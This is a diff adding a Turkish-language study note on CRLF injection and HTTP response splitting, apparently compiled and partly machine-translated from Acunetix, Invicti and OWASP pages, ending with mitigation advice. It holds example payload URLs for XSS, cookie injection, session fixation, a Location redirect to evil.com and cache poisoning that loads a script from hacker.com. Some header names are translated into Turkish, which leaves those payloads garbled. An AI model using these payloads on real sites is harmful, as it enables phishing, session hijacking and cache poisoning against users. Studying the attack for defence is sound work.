@@ -1,0 +1,81 @@
+CRLF enjeksiyonu nedir?
+    CRLF enjeksiyonu kötü niyetli bir bilgisayar korsanının, bir web uygulamasının çalışma şeklini değiştirmek veya yöneticisinin kafasını karıştırmak için satır başı (CR) ve satır akışı (LF) karakterleri eklemesine olanak tanıyan bir güvenlik açığıdır. CRLF enjeksiyonları için iki ana kötü amaçlı kullanım vardır: log poisoning (also called log injection, log splitting, or log forging) and HTTP yanıt bölme.
+    Saldırganlar CRLF enjeksiyonlarını kullanabilirler tırmandırmak başta diğer güvenlik açıklarına siteler arası komut dosyası çalıştırma (XSS). CRLF enjeksiyonları web uygulamalarında e-posta davranışını etkilemek için de kullanılabilir – buna denir e-posta enjeksiyonu (e-posta başlığı enjeksiyonu).
+
+HTTP Yanıt Bölme Nedir
+    HTTP protokolü, bir başlığın nerede bitip diğerinin nerede başladığını belirtmek için CRLF karakter dizisini kullanır. Ayrıca başlıkların nerede bittiğini ve web sitesi içeriğinin nerede başladığını belirtmek için de kullanır.
+    Saldırgan tek bir CRLF eklerse yeni bir başlık ekleyebilir. Eğer öyleyse, örneğin, a Location header, saldırgan kullanıcıyı farklı bir web sitesine yönlendirebilir. Suçlular bu tekniği kimlik avı veya tahrifat için kullanabilirler. Bu tekniğe genellikle HTTP başlık enjeksiyonu denir.
+    Saldırgan çift CRLF eklerse, HTTP başlıklarını zamanından önce sonlandırabilir ve gerçek web sitesi içeriğinden önce içerik enjekte edebilir. Enjekte edilen içerik JavaScript kodu içerebilir. Ayrıca, web sunucusundan gelen gerçek web sitesi içeriğinin web tarayıcısı tarafından göz ardı edileceği şekilde de formüle edilebilir. HTTP yanıt bölme işlemi bu şekilde birlikte kullanılır Siteler Arası Komut Dosyası Çalıştırma (XSS).
+
+Aşağıdaki basitleştirilmiş örnekte CRLF şu amaçlarla kullanılır:
+    Sahte bir HTTP yanıt başlığı ekleyin: Content-Length: 0. Bu, web tarayıcısının bunu sonlandırılmış bir yanıt olarak ele almasına ve yeni bir yanıtı ayrıştırmaya başlamasına neden olur.
+    Sahte bir HTTP yanıtı ekleyin: HTTP/1.1 200 OK. Bu yeni yanıtı başlatır.
+    Başka bir sahte HTTP yanıt başlığı ekleyin: Content-Type: text/html. Bu, web tarayıcısının içeriği düzgün bir şekilde ayrıştırması için gereklidir.
+    Başka bir sahte HTTP yanıt başlığı daha ekleyin: Content-Length: 25. Bu, web tarayıcısının yalnızca sonraki 25 baytı ayrıştırmasına neden olur.
+    XSS ile sayfa içeriği ekleyin: <script>alert(1)</script>. Bu içerik tam olarak 25 bayta sahiptir.
+    Çünkü Content-Length header, web tarayıcısı, web sunucusundan gelen orijinal içeriği göz ardı eder.
+    http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+    Bu saldırının varyasyonları, önbelleğin saldırganın içeriğini diğer kullanıcılara sunmasını sağlamak amacıyla proxy veya web önbelleklerini zehirlemek için kullanılabilir.
+
+CRLF Enjeksiyonlarının Bulunması ve Azaltılması
+    CRLF enjeksiyonlarının etkisi sınırlı gibi görünebilir. CRLF enjeksiyonlarından bahsedilmiyor bile OWASP ilk 10 2017 web uygulaması güvenlik listesi. Ancak saldırganlar, diğer web uygulaması güvenlik açıklarından yararlanan çok daha ciddi saldırılara ulaşmak için CRLF enjeksiyonlarını etkili bir şekilde kullanabilir. Bu nedenle, CRLF enjeksiyon güvenlik açıklarını ciddi şekilde tedavi etmelisiniz.
+    Neyse ki, Acunetix'i kullanarak otomatik bir web taraması çalıştırarak web sitenizin veya web uygulamanızın CRLF enjeksiyonlarına ve diğer güvenlik açıklarına karşı savunmasız olup olmadığını test etmek kolaydır güvenlik açığı tarayıcı. Bir demo al ve web sitenize veya web uygulamanıza karşı tarama yapmak hakkında daha fazla bilgi edinin.
+
+1. XSS veya Siteler Arası Komut Dosyası Çalıştırma
+    XSS veya Siteler Arası Komut Dosyası Çalıştırma bir saldırganın web uygulamasına kötü amaçlı JavaScript kodu enjekte etmesine olanak tanıyan bir güvenlik açığıdır. Aşağıdaki GET istekleri, XSS ile CRLF Enjeksiyonu deneme zincirinde hazırlanmıştır. 
+    Hassas kullanıcı bilgilerini içeren bir uyarı patlatarak 
+    www.target.com/%3f%0d%0aKonum:%0d%0aİçerik-Tip:text/html%0d%0aX-XSS-Koruma%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+    XSS Korumasını Devre Dışı Bırakarak 
+    www.target.com/%0d%0aİçerik-Uzunluk:35%0d%0aX-XSS-Koruma:0%0d%0a%0d%0a23
+
+2. Çerez Enjeksiyonu
+    HTTP Yanıt Bölme, bir saldırganın kurbanın tarayıcısında kötü amaçlı çerezler ayarlamasına olanak tanır. Çoğu durumda, aşağıdaki GET isteği bir 307 Yönlendirmesi ile sonuçlanacaktır ve böylece kurban target.com'a yönlendirilecektir & URL, Set-Cookie parametresini içermeyecektir. Ancak arka planda çerez ayarlanacaktır. 
+    www.target.com/%0d%0aSet-Çerez:CRLFInjection=MaliciousCookieSet
+    Click to enlarge
+
+3. Kimlik Avı Saldırıları
+    CRLF Enjeksiyon saldırısını kullanan bir saldırgan, kurbanı kötü web sitesine yönlendirecek Konum başlığını ayarlayabilir. Bu web sitesi tıpkı hedef web sitesine benzeyecek şekilde geliştirilebilir ve kurban kimlik bilgilerini girdiğinde saldırgana gönderilir. Konum başlığı şu şekilde ayarlanabilir:
+    GET /%0d%0aLocation:%20https://evil.com/ HTTP/1.1
+
+4. Oturum Sabitleme
+    Çerez Enjeksiyon saldırısına benzer şekilde, CRLF Enjeksiyon saldırısında saldırgan, kullanıcının oturum kimliğini belirli bir değere ayarlar. Bu bağlantı kurbana gönderilir ve kurban bu oturumu kullanarak oturum açtığında saldırgan aynı oturum kimliğini kullanarak da oturum açabilir. 
+    www.target.com/%0d%0aSet-Cookie:session_id=942....
+
+5. HTTP Başlık Enjeksiyonu
+    Saldırgan enjekte etmek için CRLF enjeksiyonundan yararlanabilir HTTP Başlıkları bir uygulamada XSS filtreleri veya aynı kaynak politikası gibi güvenlik mekanizmalarını yenmek için. 
+    www.target.com/%0d%0aHackersBaşkan:NewHeader
+    CORS (Çapraz Kaynak Kaynak Paylaşımı) etkinleştirme başlıkları enjekte edilebilir ve saldırgan, farklı kökenlerden sitelerin birbirine erişmesini engelleyen SOP (Aynı Kaynak Politikası) tarafından korunan hassas kaynaklara erişmek için JavaScript kullanabilir.
+
+6. Web Önbellek zehirlenmesi
+    Web-önbellek zehirlenmesi bir saldırganın bir web önbelleğini değiştirerek zehirli içerik sunabileceği bir tekniktir. Bu sorundan başarılı bir şekilde yararlanmak için, bir saldırganın savunmasız web sitesinin önbellekleme proxy'sini, sendikatörlerini, içerik dağıtım ağlarını (CDN'ler) veya istemci ile sunucu arasındaki diğer önbellekleme mekanizmalarını zehirlemesi gerekir. Başarılı bir web önbelleği zehirlenmesinden sonra, kurbanın önbellek tarafından kendilerine sunulan kötü amaçlı içerik hakkında hiçbir fikri olmayacaktır. Aşağıda, bir saldırganın bir web önbelleğini zehirleyerek ana bilgisayar başlığı enjeksiyonundan (CRLF Enjeksiyon Saldırısı kullanarak) nasıl yararlanabileceğinin bir örneği bulunmaktadır.
+    Aşağıdaki Talep için: 
+        $ telnet www.target.com 80
+        Xxxx'i deniyorum...
+        Www.target.com sitesine bağlandı.
+        Kaçış karakteri '^]'dir.
+        GET /% 0d% 0aX-Forwarded-Host: hacker.com HTTP/1.1 / / veya Host
+        Ana bilgisayar: target.com
+    Şu cevap olacaktı: 
+        HTTP/1.1 200 TAMAM
+        <title>Example</title>
+        <script src="http://hacker.com/script.js">
+Çeşitli Kullanım Durumları: 
+    1. Sahte bir HTTP yanıt başlığı enjekte etmek: 
+    İçerik Uzunluğu: 10
+    Artık web tarayıcısı yalnızca sonraki 10 baytı ayrıştıracak. 
+    2. Sahte bir HTTP yanıt başlığı enjekte etmek: 
+    İçerik Uzunluğu: 0
+    Bu, sonlandırılmış bir yanıt olarak kabul edilir ve web tarayıcıları yeni bir yanıtı ayrıştırmaya başlar.
+
+Azaltımlar:
+    Bir geliştirici, CRLF enjeksiyon Saldırısını önlemek için aşağıdaki şeyleri akılda tutmalıdır:
+    Kullanıcı girişinin sanitizasyonu.
+    CR ve LF karakterlerini (\r, \n) kodlayın, böylece tedarik edilseler bile sunucu tarafından tanınmazlar.
+    Yanıt başlıklarına ulaşmadan önce kullanıcı girişini doğrulayın (örneğin StringEscapeUtils.escapeJava () gibi yöntemleri kullanarak).
+     Gereksiz bir başlık devre dışı bırakılmalıdır.
+Kaynak:
+    https://www.invicti.com/learn/crlf-injection
+    https://www.acunetix.com/websitesecurity/crlf-injection/
+    https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+
+    https://www.geeksforgeeks.org/linux-unix/crlf-injection-attack/
